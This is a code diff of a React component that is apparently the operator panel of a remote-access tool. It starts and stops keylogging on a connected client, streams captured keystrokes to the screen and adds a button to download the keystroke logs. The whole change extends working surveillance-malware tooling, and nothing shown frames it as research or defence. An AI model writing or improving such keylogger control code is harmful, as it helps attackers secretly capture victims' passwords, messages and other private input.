@@ -1,4 +1,4 @@
-import { Trash2 } from 'lucide-react';
+import { Download, Trash2 } from 'lucide-react';
 import { motion } from 'motion/react';
 import { useEffect, useRef, useState } from 'react';
 import { useGateway } from '../../services';
@@ -13,22 +13,30 @@ export function Keylogger({ backendId }: KeyloggerProps) {
   const { activeClient, sendCommand } = useGateway();
   const keylogContainerRef = useRef<HTMLDivElement>(null);
 
-  // Optimistic local state
-  const [localActive, setLocalActive] = useState(false);
+  // Local keylogs for frontend-only clearing
+  const [localKeylogs, setLocalKeylogs] = useState<Array<{text: string, timestamp: number}>>([]);
 
   // Get real state from backend
   const backendState = activeClient?.state.keylogger || 'idle';
-  const keylogs = activeClient?.keylogs || [];
+  const serverKeylogs = activeClient?.keylogs || [];
 
-  // Use optimistic state for immediate UI feedback
-  const isActive = localActive || backendState === 'active';
+  // Optimistic local state - can override backend state for immediate UI feedback
+  const [localActive, setLocalActive] = useState<boolean | null>(null);
+  // If localActive is explicitly set (not null), use it; otherwise use backend state
+  const isActive = localActive !== null ? localActive : backendState === 'active';
 
-  // Sync local state with backend state
+  // Sync local keylogs with server keylogs (append new ones)
   useEffect(() => {
-    if (backendState === 'active') {
-      setLocalActive(true);
-    } else if (backendState === 'idle') {
-      setLocalActive(false);
+    if (serverKeylogs.length > localKeylogs.length) {
+      setLocalKeylogs(serverKeylogs);
+    }
+  }, [serverKeylogs]);
+
+  // Sync local state with backend state - reset localActive when backend confirms
+  useEffect(() => {
+    // When backend state changes, let it take over from optimistic state
+    if (backendState === 'active' || backendState === 'idle') {
+      setLocalActive(null); // Reset to let backend state control
     }
   }, [backendState]);
 
@@ -37,16 +45,26 @@ export function Keylogger({ backendId }: KeyloggerProps) {
     if (keylogContainerRef.current) {
       keylogContainerRef.current.scrollTop = keylogContainerRef.current.scrollHeight;
     }
-  }, [keylogs]);
+  }, [localKeylogs]);
 
   const handleStart = () => {
+    setLocalActive(true); // Immediate UI feedback
     sendCommand('start_keylog');
-    setTimeout(() => setLocalActive(true), 500); // 500ms delay
   };
 
   const handleStop = () => {
+    setLocalActive(false); // Immediate UI feedback
     sendCommand('stop_keylog');
-    setTimeout(() => setLocalActive(false), 500); // 500ms delay
+  };
+
+  const handleClearLocal = () => {
+    // Frontend-only clear - logs are still kept on backend
+    setLocalKeylogs([]);
+  };
+
+  const handleDownloadLogs = () => {
+    // Request log file from backend
+    sendCommand('download_keylogs');
   };
 
   return (
@@ -64,10 +82,17 @@ export function Keylogger({ backendId }: KeyloggerProps) {
             ]}
           />
         </div>
-        {isActive && keylogs.length > 0 && (
-          <Button variant="outline" size="sm">
-            <Trash2 className="w-4 h-4 mr-2" /> Clear Logs
-          </Button>
+        {isActive && (
+          <div className="flex gap-2">
+            <Button variant="outline" size="sm" onClick={handleDownloadLogs}>
+              <Download className="w-4 h-4 mr-2" /> Download Logs
+            </Button>
+            {localKeylogs.length > 0 && (
+              <Button variant="outline" size="sm" onClick={handleClearLocal}>
+                <Trash2 className="w-4 h-4 mr-2" /> Clear Display
+              </Button>
+            )}
+          </div>
         )}
       </div>
 
@@ -103,7 +128,7 @@ export function Keylogger({ backendId }: KeyloggerProps) {
             ref={keylogContainerRef}
             className="flex-1 bg-gray-900 rounded-xl overflow-hidden p-4 font-mono text-sm text-green-400 overflow-y-auto"
           >
-            {keylogs.length === 0 ? (
+            {localKeylogs.length === 0 ? (
               <motion.div
                 animate={{ opacity: [0.4, 1, 0.4] }}
                 transition={{ duration: 2, repeat: Infinity }}
@@ -112,7 +137,7 @@ export function Keylogger({ backendId }: KeyloggerProps) {
                 Waiting for keystrokes...
               </motion.div>
             ) : (
-              keylogs.map((log, idx) => (
+              localKeylogs.map((log, idx) => (
                 <motion.div
                   key={idx}
                   initial={{ opacity: 0, x: -10 }}
@@ -132,7 +157,7 @@ export function Keylogger({ backendId }: KeyloggerProps) {
                 <div className="w-2 h-2 bg-green-500 rounded-full animate-pulse" />
                 <span className="text-sm">Keylogger Active</span>
               </div>
-              <span className="text-sm text-gray-400">• {keylogs.length} keystrokes</span>
+              <span className="text-sm text-gray-400">• {localKeylogs.length} keystrokes</span>
             </div>
             <Button
               onClick={handleStop}
